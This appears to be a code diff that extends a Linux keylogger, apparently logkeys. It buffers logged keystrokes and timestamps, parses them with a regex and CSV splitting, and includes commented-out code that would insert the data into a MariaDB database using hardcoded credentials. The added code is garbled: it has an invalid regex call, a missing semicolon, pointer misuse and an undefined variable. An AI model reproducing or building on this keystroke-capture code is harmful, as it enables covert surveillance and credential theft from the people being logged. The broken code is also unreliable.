@@ -25,6 +25,9 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <linux/input.h>
+#include <mariadb/include/conncpp.hpp>
+#include <string.h>
+#include <regex>
 
 #ifdef HAVE_CONFIG_H
 # include <config.h>  // include config produced from ./configure
@@ -528,7 +531,7 @@ FILE* open_log_file()
 
 
 // Writes event to log file and returns the increased file size
-int log_event(FILE *out)
+int log_event(FILE *out, string *stringa, string *SqlData)
 {
   int inc_size = 0;
   unsigned short scan_code = key_state.event.code;
@@ -562,11 +565,62 @@ int log_event(FILE *out)
     else {
       strftime(timestamp, sizeof(timestamp),TIME_FORMAT "\n", localtime(&key_state.event.time.tv_sec));
       inc_size += fprintf(out, "%s", timestamp);  // then timestamp and newline
+      stringa.append(timestamp);
+
+      if (regex_match (stringa, regex("[0-9]+","[0-9]+","[0-9]+","[0-9]{4}-[0-9]{2}-[0-9]{2}\s[0-9]{2}:[0-9]{2}:[0-9]{2}(\.[0-9]{1,3})?") )){
+      std::stringstream ss;
+	    ss << stringa;
+      int C=0;
+	    while (ss >> std::ws) {
+		    std::string csvElement;
+		
+		if (ss.peek() == '"') {
+			ss >> std::quoted(csvElement);
+			std::string discard;
+			std::getline(ss, discard, ',');
+		}
+		else {
+			std::getline(ss, csvElement, ',');
+		}
+
+    SqlData[C]=csvElement
+    C++;
+
+    if(C==4){
+      C=0;
+      for (int i=0; i<4; i++)
+{
+std::cout << "index: " << i << " - value: " << SqlData[i] << "\n";
+}
+/*
+      // Instantiate Driver
+      sql::Driver* driver = sql::mariadb::get_driver_instance();
+
+      // Configure Connection
+      sql::SQLString url("jdbc:mariadb://localhost:3306/todo");
+      sql::Properties properties({{"user", "app_user"}, {"password", "Password123!"}});
+
+      // Establish Connection
+      std::unique_ptr<sql::Connection> conn(driver->connect(url, properties));
+
+      // Create a new PreparedStatement
+      std::unique_ptr<sql::PreparedStatement> stmnt(conn->prepareStatement("insert into tasks (description) values (?)"));
+
+      // Bind values to SQL statement
+      stmnt->setString(1, description);
+
+      // Execute query
+      stmnt->executeQuery();*/
+      }
+    }
+	}
+
     }
   }
   if (is_char_key(scan_code)) {
     // print character or string corresponding to received keycode; only print chars when not \0
     if (key_state.key != L'\0') inc_size += fprintf(out, "%lc", key_state.key);  // write character to log file
+    stringa.append(key_state.key);
   }
   else if (is_func_key(scan_code)) {
     if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
